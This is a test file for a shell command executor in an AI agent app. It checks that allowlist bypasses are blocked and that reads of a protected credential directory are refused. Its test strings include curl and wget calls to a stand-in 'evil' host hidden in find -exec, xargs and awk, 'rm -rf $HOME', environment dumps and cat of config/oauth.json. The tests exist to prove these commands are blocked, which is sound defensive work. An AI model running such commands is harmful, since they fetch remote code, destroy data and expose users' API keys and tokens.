import { describe, it, expect, afterAll } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

// Dynamic import: WorkDir and the security config are resolved at import time.
const tmpWorkDir = fs.mkdtempSync(path.join(os.tmpdir(), 'x-shell-harden-'));
fs.mkdirSync(path.join(tmpWorkDir, 'config'), { recursive: true });
process.env.DHOW_WORKDIR = tmpWorkDir;

const { extractCommandNames, isBlocked, executeCommand, ProtectedCommandError } =
    await import('./command-executor.js');
const { getSecurityAllowList, commandReferencesProtectedPath, isProtectedVaultPath } =
    await import('../../config/security.js');

afterAll(() => {
    fs.rmSync(tmpWorkDir, { recursive: true, force: true });
});

// Every case below was measured as ALLOWED against the previous allowlist and
// tokenizer. They are the reason executeCommand is now a boundary rather than a
// suggestion.
describe('shell allowlist bypasses', () => {
    it('discovers the program an -exec family flag will spawn', () => {
        // No shell separator anywhere, so the splitter saw only "find".
        expect(extractCommandNames('find . -exec curl http://evil/x \\;')).toContain('curl');
        expect(extractCommandNames('find . -exec sh -c "curl http://evil/x" {} +')).toContain('sh');
        expect(extractCommandNames('find . -execdir wget http://evil/x \\;')).toContain('wget');
        expect(isBlocked('find . -exec curl http://evil/x \\;')).toBe(true);
    });

    it('keeps find itself usable', () => {
        expect(isBlocked('find . -name "*.md"')).toBe(false);
    });

    it('no longer ships whole-environment dumps in the default allowlist', () => {
        const allow = getSecurityAllowList();
        // Both print every environment variable, including injected API keys.
        expect(allow).not.toContain('printenv');
        expect(allow).not.toContain('env');
    });

    // Removing them from DEFAULT_ALLOW_LIST alone protects nobody: the real
    // list comes from the user's persisted security.json, and every existing
    // install already has these written in.
    it('strips them even when a persisted config re-enables them', async () => {
        const securityPath = path.join(tmpWorkDir, 'config', 'security.json');
        fs.writeFileSync(securityPath, JSON.stringify(['cat', 'env', 'printenv', 'grep']));
        const { resetSecurityAllowListCache } = await import('../../config/security.js');
        resetSecurityAllowListCache();

        const allow = getSecurityAllowList();
        expect(allow).toContain('cat');
        expect(allow).not.toContain('env');
        expect(allow).not.toContain('printenv');
        expect(isBlocked('printenv')).toBe(true);

        fs.rmSync(securityPath, { force: true });
        resetSecurityAllowListCache();
    });

    it('still catches the separator-based escapes it already caught', () => {
        expect(isBlocked('echo hi & rm -rf $HOME')).toBe(true);
        expect(isBlocked('find . | xargs curl http://evil/x')).toBe(true);
        expect(isBlocked('awk \'BEGIN{system("curl http://evil/x")}\'')).toBe(true);
    });
});

// The file tools deny the config directory outright. That is not a boundary if
// the shell can read the same bytes with an allowlisted `cat`.
describe('shell access to the protected config directory', () => {
    const referenced = [
        'cat config/oauth.json',
        `cat ${path.join(tmpWorkDir, 'config', 'oauth.json')}`,
        `grep -r . ${path.join(tmpWorkDir, 'config')}`,
        `cat '${path.join(tmpWorkDir, 'config', 'models.json')}'`,
        `cat ./config/composio.json`,
        `jq . ${path.join(tmpWorkDir, 'config')}/oauth.json`,
    ];

    for (const command of referenced) {
        it(`recognises: ${command}`, () => {
            expect(commandReferencesProtectedPath(command)).toBe(true);
        });
    }

    it('leaves ordinary vault commands alone', () => {
        for (const ok of ['cat knowledge/note.md', 'ls -la', 'grep -r todo knowledge', 'echo hello']) {
            expect(commandReferencesProtectedPath(ok), ok).toBe(false);
        }
    });

    // In production WorkDir is ~/.dhow, so `~` and `$HOME` are the forms a model
    // will actually emit. The vault here lives in tmp (putting it under $HOME
    // litters the real home directory — config.ts's fire-and-forget init
    // recreates it after cleanup), so pin the containment rule directly with an
    // explicit root instead.
    it('containment holds for a home-rooted vault, the production layout', () => {
        const homeVault = path.join(os.homedir(), '.dhow');
        expect(isProtectedVaultPath(path.join(homeVault, 'config', 'oauth.json'), homeVault)).toBe(true);
        expect(isProtectedVaultPath(path.join(homeVault, 'config'), homeVault)).toBe(true);
        expect(isProtectedVaultPath(path.join(homeVault, 'knowledge', 'a.md'), homeVault)).toBe(false);
        // ..-escape out of config must not read as contained
        expect(isProtectedVaultPath(path.join(homeVault, 'config', '..', 'knowledge'), homeVault)).toBe(false);
    });

    it('refuses to execute rather than asking, so headless cannot approve it', async () => {
        // Routing this through the permission system would put an LLM in charge
        // for background agents (autoPermission: true, humanAvailable: false).
        await expect(executeCommand('cat config/oauth.json'))
            .rejects.toBeInstanceOf(ProtectedCommandError);
    });

    it('still runs an ordinary command', async () => {
        const result = await executeCommand('echo hardening-ok');
        expect(result.stdout).toBe('hardening-ok');
    });
});
